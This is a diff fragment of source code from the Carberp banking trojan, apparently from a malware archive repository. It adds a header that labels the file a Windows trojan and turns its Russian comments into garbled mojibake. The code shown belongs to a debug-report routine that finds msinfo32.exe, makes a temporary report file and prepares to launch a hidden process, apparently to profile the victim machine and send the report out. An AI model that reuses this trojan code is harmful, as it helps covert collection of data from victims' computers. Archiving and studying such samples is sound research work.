@@ -1,3 +1,14 @@
+/*
+  name      Carberp
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include "DbgRpt.h"
 #include <shlobj.h>
 
@@ -311,12 +322,12 @@ void DebugReportCreateConfigReportAndSend()
 
 	do
 	{
-		// Получаем путь к msinfo32.exe
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ msinfo32.exe
 		MsInfoPath = GetPathToMsInfo32();
 		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: GetPathToMsInfo32() return '%S;", MsInfoPath);
 		if (MsInfoPath == NULL) break;
 
-		// Временный файл для отчета
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		ReportPath = File::GetTempNameA();
 		PP_DPRINTF(L"DebugReportCreateConfigReportAndSend: GetTempNameA() for report file return '%S;", ReportPath);
 		if (ReportPath == NULL) break;
@@ -331,7 +342,7 @@ void DebugReportCreateConfigReportAndSend()
 		m_memset(&pi, 0, sizeof(pi));
 		m_memset(MsInfoParam, 0, STR::Length(MsInfoParam));
 
-		// Запускаем скрытно
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		si.cb = sizeof(si);
 		si.wShowWindow = SW_HIDE;
 		
